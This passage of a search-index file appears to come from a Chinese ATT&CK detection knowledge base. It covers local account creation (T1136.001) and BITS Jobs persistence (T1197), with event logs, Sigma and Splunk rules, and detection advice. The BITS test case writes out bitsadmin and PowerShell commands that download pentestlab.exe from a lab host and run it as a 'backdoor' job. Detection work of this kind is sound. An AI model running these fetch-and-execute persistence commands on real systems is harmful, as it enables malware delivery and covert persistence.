\u7528\u6237\u5de5\u4f5c\u7ad9: <\u672a\u8bbe\u7f6e\u503c> \u4e0a\u6b21\u8bbe\u7f6e\u7684\u5bc6\u7801:<\u4ece\u4e0d> \u5e10\u6237\u8fc7\u671f: <\u4ece\u4e0d> \u4e3b\u8981\u7ec4 ID: 513 \u5141\u8bb8\u59d4\u6258\u7ed9: - \u65e7 UAC \u503c: 0x0 \u65b0 UAC \u503c: 0x15 \u7528\u6237\u5e10\u6237\u63a7\u5236: \u5df2\u7981\u7528\u7684\u5e10\u6237 '\u4e0d\u8981\u6c42\u5bc6\u7801' - \u5df2\u542f\u7528 '\u666e\u901a\u5e10\u6237' - \u5df2\u542f\u7528 \u7528\u6237\u53c2\u6570: <\u672a\u8bbe\u7f6e\u503c> SID \u5386\u53f2: - \u767b\u5f55\u65f6\u95f4(\u4ee5\u5c0f\u65f6\u8ba1):\u5168\u90e8 \u9644\u52a0\u4fe1\u606f: \u7279\u6743 - \u4e8b\u4ef6 Xml: <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"> <System> <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\" /> <EventID>4720</EventID> <Version>0</Version> <Level>0</Level> <Task>13824</Task> <Opcode>0</Opcode> <Keywords>0x8020000000000000</Keywords> <TimeCreated SystemTime=\"2020-06-07T14:09:21.622933400Z\" /> <EventRecordID>3893</EventRecordID> <Correlation /> <Execution ProcessID=\"504\" ThreadID=\"2080\" /> <Channel>Security</Channel> <Computer>12306Br0-PC</Computer> <Security /> </System> <EventData> <Data Name=\"TargetUserName\">admin.123</Data> <Data Name=\"TargetDomainName\">12306Br0-PC</Data> <Data Name=\"TargetSid\">S-1-5-21-3579006141-3881886638-2121494774-1001</Data> <Data Name=\"SubjectUserSid\">S-1-5-21-3579006141-3881886638-2121494774-1000</Data> <Data Name=\"SubjectUserName\">12306Br0</Data> <Data Name=\"SubjectDomainName\">12306Br0-PC</Data> <Data Name=\"SubjectLogonId\">0x75a8e</Data> <Data Name=\"PrivilegeList\">-</Data> <Data Name=\"SamAccountName\">admin.123</Data> <Data Name=\"DisplayName\">%%1793</Data> <Data Name=\"UserPrincipalName\">-</Data> <Data Name=\"HomeDirectory\">%%1793</Data> <Data Name=\"HomePath\">%%1793</Data> <Data Name=\"ScriptPath\">%%1793</Data> <Data Name=\"ProfilePath\">%%1793</Data> <Data Name=\"UserWorkstations\">%%1793</Data> <Data Name=\"PasswordLastSet\">%%1794</Data> <Data Name=\"AccountExpires\">%%1794</Data> <Data Name=\"PrimaryGroupId\">513</Data> <Data Name=\"AllowedToDelegateTo\">-</Data> <Data Name=\"OldUacValue\">0x0</Data> <Data Name=\"NewUacValue\">0x15</Data> <Data Name=\"UserAccountControl\"> %%2080 %%2082 %%2084</Data> <Data Name=\"UserParameters\">%%1793</Data> <Data Name=\"SidHistory\">-</Data> <Data Name=\"LogonHours\">%%1797</Data> </EventData> </Event>","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#_6","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#sigma","text":"title: \u672c\u5730\u7528\u6237\u521b\u5efa description: \u68c0\u6d4bWindows\u670d\u52a1\u5668\u4e0a\u7684\u672c\u5730\u7528\u6237\u521b\u5efa\uff0c\u8fd9\u5728Active Directory\u73af\u5883\u4e2d\u4e0d\u9002\u7528\u3002\u4f7f\u7528\u672c\u5730\u65e5\u5fd7\uff0c\u975eAD\u65e5\u5fd7\u3002 status: \u6d4b\u8bd5\u9636\u6bb5 tags: - attack.persistence - attack.t1136-001 references: - https://patrick-bareiss.com/detecting-local-user-creation-in-ad-with-sigma/ author: 12306Br0(\u7ffb\u8bd1) date: 2020/06/07 logsource: product: windows service: security detection: selection: EventID: 4720 #\u5df2\u521b\u5efa\u7528\u6237\u5e10\u6237\u3002 condition: selection fields: - EventCode - AccountName - AccountDomain falsepositives: - \u57df\u63a7\u5236\u5668\u65e5\u5fd7 - \u7531\u7279\u6743\u5e10\u6237\u7ba1\u7406\u5de5\u5177\u7ba1\u7406\u7684\u672c\u5730\u5e10\u6237 level: low \u9664\u4e86\u57fa\u4e8e\u4e8b\u4ef6ID4720\u8fdb\u884c\u68c0\u6d4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u7528\u4e8b\u4ef6ID4688\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff08net user\uff09\u6765\u8fdb\u884c\u68c0\u6d4b\u3002","title":"Sigma\u89c4\u5219"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#splunk","text":"EventID=\"4720\" | table EventCode,AccountName,AccountDomain","title":"Splunk\u89c4\u5219"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#_7","text":"\u5efa\u8bae\u6839\u636e4688\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u4ee5\u53ca4720\u76f8\u4e92\u7ed3\u5408\u8fdb\u884c\u68c0\u6d4b\u672c\u5730\u7528\u6237\u521b\u5efa\u884c\u4e3a\u3002","title":"\u5efa\u8bae"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#_8","text":"MITRE-ATT&CK-T1136-001 https://attack.mitre.org/techniques/T1136/001/ Local User Creation https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_user_creation.yml","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/","text":"T1197-win-BITS Jobs\u6743\u9650\u7ef4\u6301 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 Windows BITS\uff08\u540e\u53f0\u667a\u80fd\u4f20\u8f93\u670d\u52a1\uff09\u662f\u4e00\u79cd\u901a\u8fc7COM\uff08\u7ec4\u4ef6\u5bf9\u8c61\u6a21\u578b\uff09\u516c\u5f00\u7684\u4f4e\u5e26\u5bbd\u5f02\u6b65\u6587\u4ef6\u4f20\u8f93\u673a\u5236\u3002BITS\u901a\u5e38\u7531\u66f4\u65b0\u7a0b\u5e8f\u3001\u6d88\u606f\u7a0b\u5e8f\u548c\u5176\u4ed6\u5e0c\u671b\u5728\u540e\u53f0\u8fd0\u884c\uff08\u4f7f\u7528\u53ef\u7528\u7a7a\u95f2\u5e26\u5bbd\uff09\u800c\u4e0d\u4e2d\u65ad\u5176\u4ed6\u7f51\u7edc\u5e94\u7528\u7684\u7a0b\u5e8f\u4f7f\u7528\u3002\u6587\u4ef6\u4f20\u8f93\u4efb\u52a1\u88ab\u5b9e\u73b0\u4e3aBITS\u4efb\u52a1\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u6587\u4ef6\u64cd\u4f5c\u961f\u5217\u3002 \u53ef\u4ee5\u901a\u8fc7PowerShell\u548cBITSAdmin\u5de5\u5177\u8bbf\u95eeBITS\u4efb\u52a1\u521b\u5efa\u548c\u7ba1\u7406\u63a5\u53e3\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u8fd0\u884c\u6076\u610f\u4ee3\u7801\u540e\u6ee5\u7528BITS\u6765\u5b9e\u73b0\u4e0b\u8f7d\u3001\u6267\u884c\u751a\u81f3\u6e05\u7406\u52a8\u4f5c\u3002BITS\u4efb\u52a1\u5305\u542b\u5728BITS\u4efb\u52a1\u6570\u636e\u5e93\u4e2d\uff0c\u4e0d\u9700\u521b\u5efa\u65b0\u6587\u4ef6\u6216\u4fee\u6539\u6ce8\u518c\u8868\uff0c\u4e14\u901a\u5e38\u662f\u4e3b\u673a\u9632\u706b\u5899\u5141\u8bb8\u7684\u3002\u542f\u7528BITS\u7684\u6267\u884c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u957f\u671f\u4efb\u52a1\uff08\u9ed8\u8ba4\u6700\u5927\u751f\u547d\u5468\u671f\u4e3a90\u5929\u4e14\u53ef\u5ef6\u957f\uff09\u6216\u5728\u4efb\u52a1\u5b8c\u6210\u6216\u51fa\u73b0\u9519\u8bef\uff08\u5305\u62ec\u7cfb\u7edf\u91cd\u542f\u540e\u7684\u9519\u8bef\uff09\u65f6\u8c03\u7528\u4efb\u610f\u7a0b\u5e8f\u6765\u5141\u8bb8\u6301\u4e45\u6027\u3002 BITS\u4e0a\u4f20\u529f\u80fd\u4e5f\u53ef\u7528\u4e8e\u6267\u884cExfiltration Over Alternative Protocol\u3002 \u6d4b\u8bd5\u6848\u4f8b Windows\u64cd\u4f5c\u7cfb\u7edf\u5305\u542b\u5404\u79cd\u5b9e\u7528\u7a0b\u5e8f\uff0c\u7cfb\u7edf\u7ba1\u7406\u5458\u53ef\u4ee5\u4f7f\u7528\u5b83\u4eec\u6765\u6267\u884c\u5404\u79cd\u4efb\u52a1\u3002\u8fd9\u4e9b\u5b9e\u7528\u7a0b\u5e8f\u4e4b\u4e00\u662f\u540e\u53f0\u667a\u80fd\u4f20\u8f93\u670d\u52a1\uff08BITS\uff09\uff0c\u5b83\u53ef\u4ee5\u4fc3\u8fdb\u6587\u4ef6\u5230Web\u670d\u52a1\u5668\uff08HTTP\uff09\u548c\u5171\u4eab\u6587\u4ef6\u5939\uff08SMB\uff09\u7684\u4f20\u8f93\u80fd\u529b\u3002Microsoft\u63d0\u4f9b\u4e86\u4e00\u4e2a\u540d\u4e3a\u201cbitsadmin\u201d\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u548cPowerShell cmdlet\uff0c\u7528\u4e8e\u521b\u5efa\u548c\u7ba1\u7406\u6587\u4ef6\u4f20\u8f93\u3002 \u4ece\u653b\u51fb\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u53ef\u4ee5\u6ee5\u7528\u6b64\u529f\u80fd\uff0c\u4ee5\u4fbf\u5728\u53d7\u611f\u67d3\u7684\u4e3b\u673a\u4e0a\u4e0b\u8f7d\u6709\u6548\u8d1f\u8f7d\uff08\u53ef\u6267\u884c\u6587\u4ef6\uff0cPowerShell\u811a\u672c\uff0cScriptlet\u7b49\uff09\u5e76\u5728\u7ed9\u5b9a\u65f6\u95f4\u6267\u884c\u8fd9\u4e9b\u6587\u4ef6\uff0c\u5728\u7ea2\u961f\u64cd\u4f5c\u4e2d\u53ef\u4ee5\u7528\u4f5c\u4fdd\u6301\u6301\u4e45\u6027\u3002\u4f46\u662f\uff0c\u4e0e\u201cbitsadmin\u201d\u8fdb\u884c\u4ea4\u4e92\u9700\u8981\u7ba1\u7406\u5458\u7ea7\u522b\u7684\u6743\u9650\u3002 \u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u4f1a\u5c06\u6076\u610f\u6709\u6548\u8d1f\u8f7d\u4ece\u8fdc\u7a0b\u4f4d\u7f6e\u4e0b\u8f7d\u5230\u672c\u5730\u76ee\u5f55\u3002 bitsadmin /transfer backdoor /download /priority high http://10.0.2.21/pentestlab.exe C:\\tmp\\pentestlab.exe #\u6ce8\u610f\u6b64\u5904\u4e0b\u8f7d\u5730\u5740\u5fc5\u987b\u662f\u6807\u51c6\u7684HTTP\u534f\u8bae\u3002 \u8fd8\u6709\u4e00\u4e2aPowerShell cmdlet\u53ef\u4ee5\u6267\u884c\u76f8\u540c\u7684\u4efb\u52a1\u3002 Start-BitsTransfer -Source \"http://10.0.2.21/pentestlab.exe\" -Destination \"C:\\tmp\\pentestlab.exe\" \u5c06\u6587\u4ef6\u653e\u5165\u78c1\u76d8\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ece\u201cbitsadmin\u201d\u5b9e\u7528\u7a0b\u5e8f\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u6765\u5b9e\u73b0\u6301\u4e45\u6027\u3002\u7528\u6cd5\u975e\u5e38\u7b80\u5355\uff1a \u5728\u521b\u5efa\u53c2\u6570\u9700\u8981\u4efb\u52a1\u7684\u540d\u79f0 bitsadmin /create backdoor \u8be5addfile\u9700\u8981\u6587\u4ef6\u7684\u8fdc\u7a0b\u4f4d\u7f6e\u548c\u672c\u5730\u8def\u5f84 bitsadmin /addfile backdoor \"http://10.0.2.21/pentestlab.exe\" \"C:\\tmp\\pentestlab.exe\" \u8be5SetNotifyCmdLine\u5c06\u6267\u884c\u7684\u547d\u4ee4 bitsadmin /SetNotifyCmdLine backdoor C:\\tmp\\pentestlab.exe NUL \u6240\u8ff0SetMinRetryDelay\u5b9a\u4e49\u65f6\u95f4\u56de\u8c03\uff08\u79d2\uff09 bitsadmin /SetMinRetryDelay \"backdoor\" 60 \u8be5\u7b80\u5386\u53c2\u6570\u5c06\u8fd0\u884c\u4f4d\u5de5\u4f5c bitsadmin /resume backdoor \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7/windows BITS\u5e94\u7528\u65e5\u5fd7/Windows sysmon\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6d4b\u8bd5\u7559\u75d5 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 title: Bitsadmin Download status: \u6d4b\u8bd5\u9636\u6bb5 description: \u8bd5\u7528bitsadmin\u8fdb\u884c\u4e0b\u8f7d\u4efb\u52a1 references: - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin - https://isc.sans.edu/diary/22264 tags: - attack.defense_evasion - attack.persistence - attack.t1197 - attack.s0190 logsource: category: process_creation product: windows detection: selection1: Eventid: - 4688 #windows \u8fdb\u7a0b\u521b\u5efa\uff0c\u5f53\u7cfb\u7edf\u7248\u672c\u57282012\u4ee5\u4e0a\uff0c\u53ef\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u53ef\u57fa\u4e8e\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u76d1\u63a7\u3002 - 1 #sysmon \u8fdb\u7a0b\u521b\u5efa\uff0c\u5f53\u7cfb\u7edf\u4e2d\u90e8\u7f72\u6709sysmon\uff0c\u53ef\u901a\u8fc7sysmon\u4e2d\u7684\u8fdb\u7a0b\u521b\u5efa\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 Image: - '*\\bitsadmin.exe' #\u6b64\u89c4\u5219\u68c0\u6d4b\u4f5c\u7528\u6709\u9650\uff0c\u4e0d\u9488\u5bf9powershelll\u4e0b\u573a\u666f\u505a\u68c0\u6d4b CommandLine: - '* /transfer *' selection2: CommandLine: - '*copy bitsadmin.exe*' condition: selection1 or selection2 fields: - CommandLine - ParentCommandLine falsepositives: - Some legitimate apps use this, but limited. level: medium \u5efa\u8bae \u5efa\u8bae\u975e\u7cfb\u7edf\u7a0b\u5e8f\u53d1\u8d77\u7684BITS\u4f20\u9001\u4efb\u52a1\u8fdb\u884c\u5206\u6790\u68c0\u6d4b\uff08\u767d\u540d\u5355\u673a\u5236\uff09\u3002 BITS\u4f5c\u4e3a\u670d\u52a1\u8fd0\u884c\u3002\u53ef\u4f7f\u7528Sc\u67e5\u8be2\u5b9e\u7528\u7a0b\u5e8f\uff08sc query bits\uff09\u6765\u68c0\u67e5\u5176\u72b6\u6001\u3002\u53ef\u4f7f\u7528BITSAdmin\u5de5\u5177\uff08bitsadmin/list/allusers/verbose\uff09\u679a\u4e3e\u6d3b\u8dc3\u7684BITS\u4efb\u52a1\u3002 \u76d1\u63a7BITSAdmin\u5de5\u5177\uff08\u5c24\u5176\u662fTransfer\uff0cCreate\uff0cAddFile\uff0cSetNotifyFlags\uff0cSetNotifyCmdLine\uff0cSetMinRetryDelay\uff0cSetCustomHeaders\u548cResume\u547d\u4ee4\u9009\u9879\uff09\u7684\u4f7f\u7528\u53caWindows\u4e8b\u4ef6\u65e5\u5fd7\u6765\u67e5\u770bBITS\u6d3b\u52a8\u3002\u8fd8\u8981\u8003\u8651\u901a\u8fc7\u89e3\u6790BITS\u4efb\u52a1\u6570\u636e\u5e93\u6765\u8c03\u67e5\u4efb\u52a1\u76f8\u5173\u7684\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\u3002 \u76d1\u63a7\u548c\u5206\u6790BITS\u751f\u6210\u7684\u7f51\u7edc\u6d3b\u52a8\u3002BITS\u4efb\u52a1\u4f7f\u7528HTTP\uff08S\uff09\u548cSMB\u8fdb\u884c\u8fdc\u7a0b\u8fde\u63a5\uff0c\u4ec5\u9650\u4e8e\u521b\u5efa\u7528\u6237\uff0c\u5e76\u4e14\u4ec5\u5728\u8be5\u7528\u6237\u767b\u5f55\u65f6\u624d\u8d77\u4f5c\u7528\uff08\u5373\u4f7f\u7528\u6237\u5c06\u4efb\u52a1\u9644\u52a0\u5230\u670d\u52a1\u8d26\u53f7\uff0c\u6b64\u89c4\u5219\u4e5f\u9002\u7528\uff09\u3002 \u53c2\u8003\u63a8\u8350 Window\u6743\u9650\u7ef4\u6301\uff08\u516d\uff09 BITS Jobs https://www.cnblogs.com/xiaozi/p/11833583.html MITRE-ATT&CK-T1197 https://attack.mitre.org/techniques/T1197/ MITRE ATT&CK \u653b\u51fb\u77e5\u8bc6\u5e93\uff08\u4f01\u4e1a\uff09\u4e2d\u6587\u7248 https://hansight.github.io/#/detail BITS\u6301\u4e45\u5316\u7559\u75d5\u65e5\u5fd7\u6587\u4ef6\u4e0b\u8f7d\u5730\u5740 https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/blob/master/Persistence/persist_bitsadmin_Microsoft-Windows-Bits-Client-Operational.evtx","title":"T1197-win-BITS Jobs\u6743\u9650\u7ef4\u6301"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#t1197-win-bits-jobs","text":"","title":"T1197-win-BITS Jobs\u6743\u9650\u7ef4\u6301"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#attck","text":"Windows BITS\uff08\u540e\u53f0\u667a\u80fd\u4f20\u8f93\u670d\u52a1\uff09\u662f\u4e00\u79cd\u901a\u8fc7COM\uff08\u7ec4\u4ef6\u5bf9\u8c61\u6a21\u578b\uff09\u516c\u5f00\u7684\u4f4e\u5e26\u5bbd\u5f02\u6b65\u6587\u4ef6\u4f20\u8f93\u673a\u5236\u3002BITS\u901a\u5e38\u7531\u66f4\u65b0\u7a0b\u5e8f\u3001\u6d88\u606f\u7a0b\u5e8f\u548c\u5176\u4ed6\u5e0c\u671b\u5728\u540e\u53f0\u8fd0\u884c\uff08\u4f7f\u7528\u53ef\u7528\u7a7a\u95f2\u5e26\u5bbd\uff09\u800c\u4e0d\u4e2d\u65ad\u5176\u4ed6\u7f51\u7edc\u5e94\u7528\u7684\u7a0b\u5e8f\u4f7f\u7528\u3002\u6587\u4ef6\u4f20\u8f93\u4efb\u52a1\u88ab\u5b9e\u73b0\u4e3aBITS\u4efb\u52a1\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u6587\u4ef6\u64cd\u4f5c\u961f\u5217\u3002 \u53ef\u4ee5\u901a\u8fc7PowerShell\u548cBITSAdmin\u5de5\u5177\u8bbf\u95eeBITS\u4efb\u52a1\u521b\u5efa\u548c\u7ba1\u7406\u63a5\u53e3\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u8fd0\u884c\u6076\u610f\u4ee3\u7801\u540e\u6ee5\u7528BITS\u6765\u5b9e\u73b0\u4e0b\u8f7d\u3001\u6267\u884c\u751a\u81f3\u6e05\u7406\u52a8\u4f5c\u3002BITS\u4efb\u52a1\u5305\u542b\u5728BITS\u4efb\u52a1\u6570\u636e\u5e93\u4e2d\uff0c\u4e0d\u9700\u521b\u5efa\u65b0\u6587\u4ef6\u6216\u4fee\u6539\u6ce8\u518c\u8868\uff0c\u4e14\u901a\u5e38\u662f\u4e3b\u673a\u9632\u706b\u5899\u5141\u8bb8\u7684\u3002\u542f\u7528BITS\u7684\u6267\u884c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u957f\u671f\u4efb\u52a1\uff08\u9ed8\u8ba4\u6700\u5927\u751f\u547d\u5468\u671f\u4e3a90\u5929\u4e14\u53ef\u5ef6\u957f\uff09\u6216\u5728\u4efb\u52a1\u5b8c\u6210\u6216\u51fa\u73b0\u9519\u8bef\uff08\u5305\u62ec\u7cfb\u7edf\u91cd\u542f\u540e\u7684\u9519\u8bef\uff09\u65f6\u8c03\u7528\u4efb\u610f\u7a0b\u5e8f\u6765\u5141\u8bb8\u6301\u4e45\u6027\u3002 BITS\u4e0a\u4f20\u529f\u80fd\u4e5f\u53ef\u7528\u4e8e\u6267\u884cExfiltration Over Alternative Protocol\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_1","text":"Windows\u64cd\u4f5c\u7cfb\u7edf\u5305\u542b\u5404\u79cd\u5b9e\u7528\u7a0b\u5e8f\uff0c\u7cfb\u7edf\u7ba1\u7406\u5458\u53ef\u4ee5\u4f7f\u7528\u5b83\u4eec\u6765\u6267\u884c\u5404\u79cd\u4efb\u52a1\u3002\u8fd9\u4e9b\u5b9e\u7528\u7a0b\u5e8f\u4e4b\u4e00\u662f\u540e\u53f0\u667a\u80fd\u4f20\u8f93\u670d\u52a1\uff08BITS\uff09\uff0c\u5b83\u53ef\u4ee5\u4fc3\u8fdb\u6587\u4ef6\u5230Web\u670d\u52a1\u5668\uff08HTTP\uff09\u548c\u5171\u4eab\u6587\u4ef6\u5939\uff08SMB\uff09\u7684\u4f20\u8f93\u80fd\u529b\u3002Microsoft\u63d0\u4f9b\u4e86\u4e00\u4e2a\u540d\u4e3a\u201cbitsadmin\u201d\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u548cPowerShell cmdlet\uff0c\u7528\u4e8e\u521b\u5efa\u548c\u7ba1\u7406\u6587\u4ef6\u4f20\u8f93\u3002 \u4ece\u653b\u51fb\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u53ef\u4ee5\u6ee5\u7528\u6b64\u529f\u80fd\uff0c\u4ee5\u4fbf\u5728\u53d7\u611f\u67d3\u7684\u4e3b\u673a\u4e0a\u4e0b\u8f7d\u6709\u6548\u8d1f\u8f7d\uff08\u53ef\u6267\u884c\u6587\u4ef6\uff0cPowerShell\u811a\u672c\uff0cScriptlet\u7b49\uff09\u5e76\u5728\u7ed9\u5b9a\u65f6\u95f4\u6267\u884c\u8fd9\u4e9b\u6587\u4ef6\uff0c\u5728\u7ea2\u961f\u64cd\u4f5c\u4e2d\u53ef\u4ee5\u7528\u4f5c\u4fdd\u6301\u6301\u4e45\u6027\u3002\u4f46\u662f\uff0c\u4e0e\u201cbitsadmin\u201d\u8fdb\u884c\u4ea4\u4e92\u9700\u8981\u7ba1\u7406\u5458\u7ea7\u522b\u7684\u6743\u9650\u3002 \u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u4f1a\u5c06\u6076\u610f\u6709\u6548\u8d1f\u8f7d\u4ece\u8fdc\u7a0b\u4f4d\u7f6e\u4e0b\u8f7d\u5230\u672c\u5730\u76ee\u5f55\u3002 bitsadmin /transfer backdoor /download /priority high http://10.0.2.21/pentestlab.exe C:\\tmp\\pentestlab.exe #\u6ce8\u610f\u6b64\u5904\u4e0b\u8f7d\u5730\u5740\u5fc5\u987b\u662f\u6807\u51c6\u7684HTTP\u534f\u8bae\u3002 \u8fd8\u6709\u4e00\u4e2aPowerShell cmdlet\u53ef\u4ee5\u6267\u884c\u76f8\u540c\u7684\u4efb\u52a1\u3002 Start-BitsTransfer -Source \"http://10.0.2.21/pentestlab.exe\" -Destination \"C:\\tmp\\pentestlab.exe\" \u5c06\u6587\u4ef6\u653e\u5165\u78c1\u76d8\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ece\u201cbitsadmin\u201d\u5b9e\u7528\u7a0b\u5e8f\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u6765\u5b9e\u73b0\u6301\u4e45\u6027\u3002\u7528\u6cd5\u975e\u5e38\u7b80\u5355\uff1a \u5728\u521b\u5efa\u53c2\u6570\u9700\u8981\u4efb\u52a1\u7684\u540d\u79f0 bitsadmin /create backdoor \u8be5addfile\u9700\u8981\u6587\u4ef6\u7684\u8fdc\u7a0b\u4f4d\u7f6e\u548c\u672c\u5730\u8def\u5f84 bitsadmin /addfile backdoor \"http://10.0.2.21/pentestlab.exe\" \"C:\\tmp\\pentestlab.exe\" \u8be5SetNotifyCmdLine\u5c06\u6267\u884c\u7684\u547d\u4ee4 bitsadmin /SetNotifyCmdLine backdoor C:\\tmp\\pentestlab.exe NUL \u6240\u8ff0SetMinRetryDelay\u5b9a\u4e49\u65f6\u95f4\u56de\u8c03\uff08\u79d2\uff09 bitsadmin /SetMinRetryDelay \"backdoor\" 60 \u8be5\u7b80\u5386\u53c2\u6570\u5c06\u8fd0\u884c\u4f4d\u5de5\u4f5c bitsadmin /resume backdoor","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7/windows BITS\u5e94\u7528\u65e5\u5fd7/Windows sysmon\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_4","text":"","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#sigma","text":"title: Bitsadmin Download status: \u6d4b\u8bd5\u9636\u6bb5 description: \u8bd5\u7528bitsadmin\u8fdb\u884c\u4e0b\u8f7d\u4efb\u52a1 references: - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin - https://isc.sans.edu/diary/22264 tags: - attack.defense_evasion - attack.persistence - attack.t1197 - attack.s0190 logsource: category: process_creation product: windows detection: selection1: Eventid: - 4688 #windows \u8fdb\u7a0b\u521b\u5efa\uff0c\u5f53\u7cfb\u7edf\u7248\u672c\u57282012\u4ee5\u4e0a\uff0c\u53ef\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u53ef\u57fa\u4e8e\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u76d1\u63a7\u3002 - 1 #sysmon \u8fdb\u7a0b\u521b\u5efa\uff0c\u5f53\u7cfb\u7edf\u4e2d\u90e8\u7f72\u6709sysmon\uff0c\u53ef\u901a\u8fc7sysmon\u4e2d\u7684\u8fdb\u7a0b\u521b\u5efa\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 Image: - '*\\bitsadmin.exe' #\u6b64\u89c4\u5219\u68c0\u6d4b\u4f5c\u7528\u6709\u9650\uff0c\u4e0d\u9488\u5bf9powershelll\u4e0b\u573a\u666f\u505a\u68c0\u6d4b CommandLine: - '* /transfer *' selection2: CommandLine: - '*copy bitsadmin.exe*' condition: selection1 or selection2 fields: - CommandLine - ParentCommandLine falsepositives: - Some legitimate apps use this, but limited. level: medium","title":"Sigma\u89c4\u5219"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_6","text":"\u5efa\u8bae\u975e\u7cfb\u7edf\u7a0b\u5e8f\u53d1\u8d77\u7684BITS\u4f20\u9001\u4efb\u52a1\u8fdb\u884c\u5206\u6790\u68c0\u6d4b\uff08\u767d\u540d\u5355\u673a\u5236\uff09\u3002 BITS\u4f5c\u4e3a\u670d\u52a1\u8fd0\u884c\u3002\u53ef\u4f7f\u7528Sc\u67e5\u8be2\u5b9e\u7528\u7a0b\u5e8f\uff08sc query 